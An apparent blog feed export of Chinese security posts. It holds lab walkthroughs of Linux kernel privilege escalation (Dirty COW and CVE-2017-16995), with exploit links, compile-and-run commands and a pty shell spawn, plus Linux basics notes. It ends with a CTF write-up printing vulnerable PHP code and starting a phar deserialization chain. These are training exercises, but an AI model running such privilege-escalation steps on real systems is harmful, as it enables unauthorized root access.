src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145741167.png" alt="image-20220104145741167"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151550089.png" alt="image-20220104151550089"></p><p>配置参数，进行攻击</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151627775.png" alt="image-20220104151627775"></p><p>成功！</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151712264.png" alt="image-20220104151712264"></p><p>下面上传漏洞检测脚本至目标靶机</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104173845980.png" alt="image-20220104173845980"></p><p>赋予权限并运行</p><pre><code>shellchmod +x sakuras.sh./sakuras.sh</code></pre><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104174121444.png" alt="image-20220104174121444"></p><p>发现了脏牛漏洞，准备开始提权</p><p>准备好exp</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192056147.png" alt="image-20220104192056147"></p><p>链接：<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>上传 dcow.cpp到靶机 </p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192200178.png" alt="image-20220104192200178"></p><p>进行编译</p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</code></pre><p>打开交互式环境</p><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>运行</p><pre><code>./dcow</code></pre><p>成功</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192407007.png" alt="image-20220104192407007"></p><p>新建ssh链接，或者直接</p><p>su root </p><p>记得切换用户要在交换式窗口下</p><p>成功提权</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192533247.png" alt="image-20220104192533247"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权本地配合内核漏洞演示</title>
      <link href="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/"/>
      <url>/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<p>环境：Ubuntu 16.04(这里直接使用墨者学院的靶场)</p><p>漏洞编号：CVE-2017-16995</p><p>使用工具: linux-exploit-suggester-2 检测     特定exp提权</p><p>工具链接：<a href="https://github.com/jondonas/linux-exploit-suggester-2">GitHub - jondonas/linux-exploit-suggester-2: Next-Generation Linux Kernel Exploit Suggester</a></p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104134814506.png" alt="image-20220104134814506"></p><p>利用ssh工具连接</p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133116341.png" alt="image-20220104133116341"></p><p>上传工具，并运行，发现有  CVE-2017-16995 漏洞</p><p> Source: <a href="http://www.exploit-db.com/exploits/45010">http://www.exploit-db.com/exploits/45010</a></p><p>下载exp</p><p>得到45010.c</p><p>上传到服务器/tmp目录</p><p>编译执行</p><pre><code>gcc 45010.c -o 455010chmod +x 455010./ 455010</code></pre><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133424470.png" alt="image-20220104133424470"></p><p>成功提权！</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2021/11/12/Linux/"/>
      <url>/2021/11/12/Linux/</url>
      
        <content type="html"><![CDATA[<h1 id="了解Linux操作系统及安装方式"><a href="#了解Linux操作系统及安装方式" class="headerlink" title="了解Linux操作系统及安装方式"></a>了解Linux操作系统及安装方式</h1><p><img src="/2021/11/12/Linux/image-20211112001054678.png" alt="image-20211112001054678"></p><p><img src="/2021/11/12/Linux/image-20211112001133176.png" alt="image-20211112001133176"></p><p><img src="/2021/11/12/Linux/image-20211112002049844.png" alt="image-20211112002049844"></p><p><img src="/2021/11/12/Linux/image-20211112002148742.png" alt="image-20211112002148742"></p><p><img src="/2021/11/12/Linux/image-20211112002405780.png" alt="image-20211112002405780"></p><h1 id="掌握基础命令、用户帐号管理、目录和文件管理"><a href="#掌握基础命令、用户帐号管理、目录和文件管理" class="headerlink" title="掌握基础命令、用户帐号管理、目录和文件管理"></a>掌握基础命令、用户帐号管理、目录和文件管理</h1><p>命令：</p><p>uname -a  显示主机名、内核版本、硬件平台等详细信息 </p><p>uname -r 显示内核版本</p><p>cat /etc/os-release 查看版本号</p><p>hostname 显示全合格主机名</p><p>cat /proc/cpuinfo  查看cpu信息 或者lscpu</p><p>cat /proc/meminfo 查看内存信息  或者free</p><p>关机 poweroff   shutdown -h now</p><p>重启 reboot  shutdown -r now </p><p>Linux命令</p><p>用于实现某一类功能的指令或者程序</p><p>命令的执行依赖于解释器程序(例如：/bin/bash)</p><p>Linux 命令的分类</p><p>内部命令：属于shell解释器的一部分</p><p>即命令包含在shell程序本身之中，例如”history”命令</p><p>外部命令：独立于shell解释器之外的程序文件。</p><p>如何判断是外部命令还是内部？</p><p>使用：</p><p>which xx</p><p>如果可以搜索到为外部，不能则为内部</p><p>这个方法也用来查找外部命令的路径</p><p>如：</p><p>[root@o213 ~]# which ls<br>/usr/bin/ls</p><p>type  xx 了解一些命令的信息</p><p>如：</p><p>[root@o213 ~]# type ls<br>ls 是“ls –color=auto”的别名</p><p><img src="/2021/11/12/Linux/image-20211112233035921.png" alt="image-20211112233035921"></p><p>命令行编辑的几个辅助操作</p><p>Tab ：自动补齐</p><p>反斜杠 \ :强制换行</p><p>Ctrl+U :清空至行首</p><p>Ctrl+K :清空至行尾</p><p>Ctrl+L：清屏</p><p>Ctrl+C:取消本次命令编辑</p><p>内部命令help</p><p>查看Bash内部命令的帮助信息</p><p>命令的 “–help” 选项</p><p>适用于大多数外部命令</p><p>adduser 添加用户账号</p><p>passwd 设置(更改)用户口令</p><p>userdel 删除用户账号(及宿主目录)</p><p>usermod 设置用户属性</p><p> [root@o213 ~]# adduser admin  //增加用户</p><p>[root@o213 ~]# passwd admin  //修改admin的密码</p><p>[root@o213 ~]# passwd admin<br>更改用户 admin 的密码 。<br>新的密码：<br>重新输入新的密码：<br>passwd：所有的身份验证令牌已经成功更新。</p><p>[root@o213 ~]# usermod -L admin  锁定admin账号<br>[root@o213 ~]# userdel admin 删除admin账号</p><p>用户的账号信息保存在 /etc/passwd  文件中</p><p>tail -1 /etc/passwd   //从后往前显示一行</p><p>用户的加密口令保存在 /etc/shadow  文件中</p><p>tail -1 /etc/shadow</p><p>用户的宿主目录(家目录)在 /home 下</p><p>tail -1 /etc/home</p><p>切换用户</p><p>su admin  //切换到admin用户</p><p>组命令：</p><p>groupadd  添加指定名称的用户组账号</p><p>groupdel  删除指定名称的用户组账号</p><p>文件</p><p>/etc/group  保存用户组账号信息</p><pre><code>groupadd shuihugroupadd honglouuseradd -g shuihu wusong  //创建wusong用户并指定到shuihu组useradd -g honglou jiabaoyu //创建jiaobaoyu组并指定到honglou组groupadd daxia usermod -g daxia wusong //将wusong这个用户从shuihu组移到daxia组groupdel daxia  //删除组</code></pre><p><img src="/2021/11/12/Linux/image-20211113001359900.png" alt="image-20211113001359900"></p><p><img src="/2021/11/12/Linux/image-20211113001715071.png" alt="image-20211113001715071"></p><p>增加文件所有者的执行权限</p><p>chmod u+x anaconda-ks.cfg  </p><p>去除文件所属组的写权限</p><p>chmod g-w lshelp.txt</p><p>设置其他用户的文件权限为可执行</p><p>chmod o=x lshelp.txt</p><p>追加所有账号权限可读</p><p>chmod a+r anaconda-ks.cfg</p><p>chown命令：</p><p>设置文件的所以者为wusong，让所属组也跟着改</p><p>chown wusong:lshelp.txt</p><p>设置文件的所以者为root，所属组不改</p><p>chown root lshelp.txt</p><p>设置文件的所属组</p><p>chown : root lshelp.txt</p><p>查看及切换目录</p><p>pwd、cd、ls、du</p><p>pwd：查看工作目录</p><p>[root@o213 ~]# pwd<br>/root</p><p>cd：切换目录</p><p>cd ~  回家</p><p>ls：显示目录内容</p><p>ls -l:以长格式显示</p><p>ls -a:显示所有子目录和文件的信息，包括隐藏文件</p><p>ls -A:类似于”-a”,但不显示”.”和”..”目录的信息</p><p>ls -d:显示目录本身的属性</p><p>ls -h:以更易读的字节单位(K、M等)显示信息</p><p>ls -R:递归显示内容</p><p>ls –color:以颜色区分不同类型文件</p><p>创建目录和文件</p><p>mkdir、touch、In</p><p>mkdir a/b/c/d  创建多层目录 </p><p>touch aa.txt 创建一个空文件</p><p>ln：为文件或目录建立链接</p><pre><code>[root@o213 ~]# ln -s /usr/bin/ls aa[root@o213 ~]# lsaa  anaconda-ks.cfgln lshelp.txt abc //建立硬链接</code></pre><p>符号链接：指向原始文件所在的路径，又称为软链接</p><p>硬链接：</p><p>指向原始文件对应的数据存储位置</p><p>不能为目录建立硬链接文件</p><p>硬链接与原始文件必须位于同一分区(文件系统)</p><p>可以使用stat命令查看：</p><pre><code>[root@o213 ~]# touch sakura.txt[root@o213 ~]# lsaa  anaconda-ks.cfg  sakura.txt[root@o213 ~]# ln sakura.txt dd[root@o213 ~]# state dd-bash: state：未找到命令[root@o213 ~]# stat dd  文件：dd  大小：0               块：0          IO 块：4096   普通空文件设备：fd00h/64768d      Inode：786445      硬链接：2权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)环境：unconfined_u:object_r:admin_home_t:s0最近访问：2021-11-13 01:10:30.704162871 +0800最近更改：2021-11-13 01:10:30.704162871 +0800最近改动：2021-11-13 01:10:58.974385168 +0800创建时间：2021-11-13 01:10:30.703162863 +0800[root@o213 ~]# stat sakura.txt  文件：sakura.txt  大小：0               块：0          IO 块：4096   普通空文件设备：fd00h/64768d      Inode：786445      硬链接：2权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)环境：unconfined_u:object_r:admin_home_t:s0最近访问：2021-11-13 01:10:30.704162871 +0800最近更改：2021-11-13 01:10:30.704162871 +0800最近改动：2021-11-13 01:10:58.974385168 +0800创建时间：2021-11-13 01:10:30.703162863 +0800</code></pre><p>复制、删除、移动目录和文件</p><p>cp、rm、mv</p><p>cp: </p><p>-r：递归复制整个目录树</p><p>-p:保持源文件的属性不变</p><p>-f:强制覆盖目标同名文件或目录</p><p>-i:需要覆盖文件或目录时进行提醒</p><p>查找目录和文件</p><p>which、find</p><p>通配符：</p><p>*  代替零个、单个或多个字符</p><p>?  代替一个字符</p><p>alias 定义别名：</p><p>alias myls=’ls -alh’</p><p>du:</p><p>统计目录及文件的空间占用清空</p><p>-a:统计时包括所有的文件，而不仅仅只统计目录</p><p>-h:以更容读的字节单位(K、M等)显示信息</p><p>-s:只统计每个参数所占用空间的总的大小</p><p>如：</p><p>du -sh /home/</p><pre><code>[root@o213 ~]# du -sh /home/60K     /home/</code></pre><p>find 命令</p><p>比如：</p><p>find /etc -name “re*.conf”</p><p>从/etc 目录找这个文件</p><p>-name:按文件名称查找</p><p>-size:按文件大小查找</p><p>-user：按文件属主查找</p><p>-type：按文件类型查找</p><h1 id="程序安装及管理"><a href="#程序安装及管理" class="headerlink" title="程序安装及管理"></a>程序安装及管理</h1><p><img src="/2021/11/12/Linux/image-20211121230756940.png" alt="image-20211121230756940"></p><p><img src="/2021/11/12/Linux/image-20211121231009685.png" alt="image-20211121231009685"></p><p><img src="/2021/11/12/Linux/image-20211121231235005.png" alt="image-20211121231235005"></p><p><img src="/2021/11/12/Linux/image-20211121231510277.png" alt="image-20211121231510277"></p><p><img src="/2021/11/12/Linux/image-20211121232610276.png" alt="image-20211121232610276"></p><p><img src="/2021/11/12/Linux/image-20211121233634742.png" alt="image-20211121233634742"></p><p><img src="/2021/11/12/Linux/image-20211121233758176.png" alt="image-20211121233758176"></p><p><img src="/2021/11/12/Linux/image-20211121234948834.png" alt="image-20211121234948834"></p><p><img src="/2021/11/12/Linux/image-20211122000239414.png" alt="image-20211122000239414"></p><p><img src="/2021/11/12/Linux/image-20211122001630415.png" alt="image-20211122001630415"></p><h1 id="文本操作和vim编辑器使用"><a href="#文本操作和vim编辑器使用" class="headerlink" title="文本操作和vim编辑器使用"></a>文本操作和vim编辑器使用</h1><p><img src="/2021/11/12/Linux/image-20220308011741913.png" alt="image-20220308011741913"></p><p><img src="/2021/11/12/Linux/image-20220308013931204.png" alt="image-20220308013931204"></p><p><img src="/2021/11/12/Linux/image-20220308014033514.png" alt="image-20220308014033514"></p><p><img src="/2021/11/12/Linux/image-20220308014116929.png" alt="image-20220308014116929"></p><p><img src="/2021/11/12/Linux/image-20220308014233942.png" alt="image-20220308014233942"></p><p><img src="/2021/11/12/Linux/image-20220308014346074.png" alt="image-20220308014346074"></p><p><img src="/2021/11/12/Linux/image-20220308014736434.png" alt="image-20220308014736434"></p><p><img src="/2021/11/12/Linux/image-20220308015054899.png" alt="image-20220308015054899"></p><p><img src="/2021/11/12/Linux/image-20220308015347207.png" alt="image-20220308015347207"></p><p><img src="/2021/11/12/Linux/image-20220308015521810.png" alt="image-20220308015521810"></p><p><img src="/2021/11/12/Linux/image-20220308015748418.png" alt="image-20220308015748418"></p><p><img src="/2021/11/12/Linux/image-20220308015906926.png" alt="image-20220308015906926"></p><p><img src="/2021/11/12/Linux/image-20220308015952657.png" alt="image-20220308015952657"></p><p><img src="/2021/11/12/Linux/image-20220308020112384.png" alt="image-20220308020112384"></p><p><img src="/2021/11/12/Linux/image-20220308020212017.png" alt="image-20220308020212017"></p><h1 id="磁盘及文件系统管理"><a href="#磁盘及文件系统管理" class="headerlink" title="磁盘及文件系统管理"></a>磁盘及文件系统管理</h1><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><p><img src="/2021/11/12/Linux/image-20220308141343118.png" alt="image-20220308141343118"></p><p><img src="/2021/11/12/Linux/image-20220308141518463.png" alt="image-20220308141518463"></p><p><img src="/2021/11/12/Linux/image-20220308141857925.png" alt="image-20220308141857925"></p><p><img src="/2021/11/12/Linux/image-20220308142045085.png" alt="image-20220308142045085"></p><h2 id="文件系统管理"><a href="#文件系统管理" class="headerlink" title="文件系统管理"></a>文件系统管理</h2><p><img src="/2021/11/12/Linux/image-20220308142954530.png" alt="image-20220308142954530"></p><p><img src="/2021/11/12/Linux/image-20220308143219045.png" alt="image-20220308143219045"></p><p><img src="/2021/11/12/Linux/image-20220308143403587.png" alt="image-20220308143403587"></p><p><img src="/2021/11/12/Linux/image-20220308143815646.png" alt="image-20220308143815646"></p><p><img src="/2021/11/12/Linux/image-20220308144414197.png" alt="image-20220308144414197"></p><p><img src="/2021/11/12/Linux/image-20220308144447054.png" alt="image-20220308144447054"></p><p><img src="/2021/11/12/Linux/image-20220308144514584.png" alt="image-20220308144514584"><img src="/2021/11/12/Linux/image-20220308152536146.png" alt="image-20220308152536146"></p><p><img src="/2021/11/12/Linux/image-20220308152716901.png" alt="image-20220308152716901"></p><h2 id="创建及管理LVM分区"><a href="#创建及管理LVM分区" class="headerlink" title="创建及管理LVM分区"></a>创建及管理LVM分区</h2><p><img src="/2021/11/12/Linux/image-20220308155422503.png" alt="image-20220308155422503"></p><p><img src="/2021/11/12/Linux/image-20220308155512004.png" alt="image-20220308155512004"></p><p><img src="/2021/11/12/Linux/image-20220308155636485.png" alt="image-20220308155636485"></p><p><img src="/2021/11/12/Linux/image-20220308160201334.png" alt="image-20220308160201334"></p><h2 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h2><p><img src="/2021/11/12/Linux/image-20220308160333556.png" alt="image-20220308160333556"></p><p><img src="/2021/11/12/Linux/image-20220308160444734.png" alt="image-20220308160444734"></p><p><img src="/2021/11/12/Linux/image-20220308160518732.png" alt="image-20220308160518732"></p><p><img src="/2021/11/12/Linux/image-20220308160855222.png" alt="image-20220308160855222"></p><p><img src="/2021/11/12/Linux/image-20220308161316439.png" alt="image-20220308161316439"></p><p><img src="/2021/11/12/Linux/image-20220308161526572.png" alt="image-20220308161526572"></p><p><img src="/2021/11/12/Linux/image-20220308161702971.png" alt="image-20220308161702971"></p><p><img src="/2021/11/12/Linux/image-20220308162017607.png" alt="image-20220308162017607"></p><p><img src="/2021/11/12/Linux/image-20220308162051869.png" alt="image-20220308162051869"></p><h1 id="系统服务管理"><a href="#系统服务管理" class="headerlink" title="系统服务管理"></a>系统服务管理</h1><h2 id="系统服务的概述"><a href="#系统服务的概述" class="headerlink" title="系统服务的概述"></a>系统服务的概述</h2><p><img src="/2021/11/12/Linux/image-20220309151533561.png" alt="image-20220309151533561"></p><p><img src="/2021/11/12/Linux/image-20220309151622437.png" alt="image-20220309151622437"></p><p><img src="/2021/11/12/Linux/image-20220309151811901.png" alt="image-20220309151811901"></p><p><img src="/2021/11/12/Linux/image-20220309151916312.png" alt="image-20220309151916312"></p><p><img src="/2021/11/12/Linux/image-20220309151949217.png" alt="image-20220309151949217"></p><p><img src="/2021/11/12/Linux/image-20220309152926717.png" alt="image-20220309152926717"></p><p><img src="/2021/11/12/Linux/image-20220309152956910.png" alt="image-20220309152956910"></p><p><img src="/2021/11/12/Linux/image-20220309153042821.png" alt="image-20220309153042821"></p><h2 id="管理系统服务"><a href="#管理系统服务" class="headerlink" title="管理系统服务"></a>管理系统服务</h2><p><img src="/2021/11/12/Linux/image-20220309153353958.png" alt="image-20220309153353958"></p><p><img src="/2021/11/12/Linux/image-20220309153524221.png" alt="image-20220309153524221"></p><p><img src="/2021/11/12/Linux/image-20220309160049784.png" alt="image-20220309160049784"></p><p><img src="/2021/11/12/Linux/image-20220309160311416.png" alt="image-20220309160311416"></p><p><img src="/2021/11/12/Linux/image-20220309160350364.png" alt="image-20220309160350364"></p><p><img src="/2021/11/12/Linux/image-20220309160421134.png" alt="image-20220309160421134"></p><h2 id="改变运行级别"><a href="#改变运行级别" class="headerlink" title="改变运行级别"></a>改变运行级别</h2><p><img src="/2021/11/12/Linux/image-20220309160525431.png" alt="image-20220309160525431"></p><p><img src="/2021/11/12/Linux/image-20220309160723356.png" alt="image-20220309160723356"></p><p><img src="/2021/11/12/Linux/image-20220309160828517.png" alt="image-20220309160828517"></p><h2 id="使用systemctl-关闭暂停和休眠系统"><a href="#使用systemctl-关闭暂停和休眠系统" class="headerlink" title="使用systemctl 关闭暂停和休眠系统"></a>使用systemctl 关闭暂停和休眠系统</h2><p><img src="/2021/11/12/Linux/image-20220309160944389.png" alt="image-20220309160944389"></p><p><img src="/2021/11/12/Linux/image-20220309161017524.png" alt="image-20220309161017524"></p><p><img src="/2021/11/12/Linux/image-20220309161025868.png" alt="image-20220309161025868"></p><p><img src="/2021/11/12/Linux/image-20220309161038493.png" alt="image-20220309161038493"></p><h1 id="Linux进程及任务计划管理"><a href="#Linux进程及任务计划管理" class="headerlink" title="Linux进程及任务计划管理"></a>Linux进程及任务计划管理</h1><p><img src="/2021/11/12/Linux/image-20220311104215174.png" alt="image-20220311104215174"></p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p><img src="/2021/11/12/Linux/image-20220311104247963.png" alt="image-20220311104247963"></p><p><img src="/2021/11/12/Linux/image-20220311104518607.png" alt="image-20220311104518607"></p><p><img src="/2021/11/12/Linux/image-20220311104647148.png" alt="image-20220311104647148"></p><p><img src="/2021/11/12/Linux/image-20220311104829567.png" alt="image-20220311104829567"></p><p><img src="/2021/11/12/Linux/image-20220311105138731.png" alt="image-20220311105138731"></p><p><img src="/2021/11/12/Linux/image-20220311105442038.png" alt="image-20220311105442038"></p><p><img src="/2021/11/12/Linux/image-20220311105857725.png" alt="image-20220311105857725"></p><p><img src="/2021/11/12/Linux/image-20220311110031422.png" alt="image-20220311110031422"></p><p><img src="/2021/11/12/Linux/image-20220311110259860.png" alt="image-20220311110259860"></p><p><img src="/2021/11/12/Linux/image-20220311110723453.png" alt="image-20220311110723453"></p><p><img src="/2021/11/12/Linux/image-20220311113001852.png" alt="image-20220311113001852"></p><p><img src="/2021/11/12/Linux/image-20220311113153962.png" alt="image-20220311113153962"></p><p><img src="/2021/11/12/Linux/image-20220311113355591.png" alt="image-20220311113355591"></p><p><img src="/2021/11/12/Linux/image-20220311113757557.png" alt="image-20220311113757557"></p><h2 id="子进程和线程"><a href="#子进程和线程" class="headerlink" title="子进程和线程"></a>子进程和线程</h2><p><img src="/2021/11/12/Linux/image-20220311113844455.png" alt="image-20220311113844455"></p><p><img src="/2021/11/12/Linux/image-20220311114421066.png" alt="image-20220311114421066"></p><p><img src="/2021/11/12/Linux/image-20220311114814428.png" alt="image-20220311114814428"></p><p><img src="/2021/11/12/Linux/image-20220311114856523.png" alt="image-20220311114856523"></p><h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><p><img src="/2021/11/12/Linux/image-20220311115108093.png" alt="image-20220311115108093"></p><p><img src="/2021/11/12/Linux/image-20220311115303445.png" alt="image-20220311115303445"></p><p><img src="/2021/11/12/Linux/image-20220311115713093.png" alt="image-20220311115713093"></p><p><img src="/2021/11/12/Linux/image-20220311115808339.png" alt="image-20220311115808339"></p><p><img src="/2021/11/12/Linux/image-20220311115842074.png" alt="image-20220311115842074"></p><p><img src="/2021/11/12/Linux/image-20220311115932812.png" alt="image-20220311115932812"></p><p><img src="/2021/11/12/Linux/image-20220311115945371.png" alt="image-20220311115945371"></p><p><img src="/2021/11/12/Linux/image-20220311115955251.png" alt="image-20220311115955251"></p><p><img src="/2021/11/12/Linux/image-20220311120220267.png" alt="image-20220311120220267"></p><p><img src="/2021/11/12/Linux/image-20220311120246084.png" alt="image-20220311120246084"></p><p><img src="/2021/11/12/Linux/image-20220311120300762.png" alt="image-20220311120300762"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2018 SimplePHP_0x50-0x5F</title>
      <link href="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/"/>
      <url>/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/</url>
      
        <content type="html"><![CDATA[<p>如图，只有两个功能点，查看文件和上传文件</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215628202.png" alt="image-20211107215628202"></p><p>上传文件功能点只能上传图片。</p><p>点击查看链接观察url</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=</a></p><p>尝试在file后加一些东西</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php</a></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215818863.png" alt="image-20211107215818863"></p><p>surprise!</p><p>继续，依次读取各个页面的源码</p><p>file.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>function.php</p><pre><code class="php">&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;        &#125;public function __wakeup()&#123;    if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker~&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p>首先观察敏感函数，我们发现了file_get_contents()，如何利用它呢，我们尝试寻找可以反序列的点。</p><p>但是本文中并没unserialize，这时候我们就可以采用phar://协议，可以达到反序列化的效果。</p><p>下面我们就要考虑，如何利用file_get_contens()这个敏感函数。</p><p>反序列化，最重要的就算里面的一些魔术方法，我们可以进行调用。</p><p>__toString  在echo一个类的时候调用</p><p>__get   未定义的属性或没有权限访问的属性被访问时该方法会被调用</p><p>下面我们来尝试构建pop利用链。</p><p>我们全局搜索$value这个变量，发现它是由get穿过来的</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220543645.png" alt="image-20211107220543645"></p><p> 我们的目标是什么呢？</p><p>使$value可控！</p><p>我们再全局搜索$key并没有发现可以传入的地方，那么说明它不受我们控制。</p><p>那我们就要突破这个点。</p><p>如何构造，使它受我们控制。</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220958104.png" alt="image-20211107220958104"></p><p>我们可以使用这个魔术方法：</p><p>当我们在Test()这个类中调用一个不存在的属性的时候就会调用它，因此我们可以通过这个方法来传入我们想要的东西。</p><p>那么如何调用Test()呢？</p><p>我们可以发现：</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221351753.png" alt="image-20211107221351753"></p><p>Test()类中不存在source，我们可以令str[‘str’] = new Test() 来调用。</p><p>而调用__toString，又需要echo这个类</p><p>我们可以利用这里</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221800425.png" 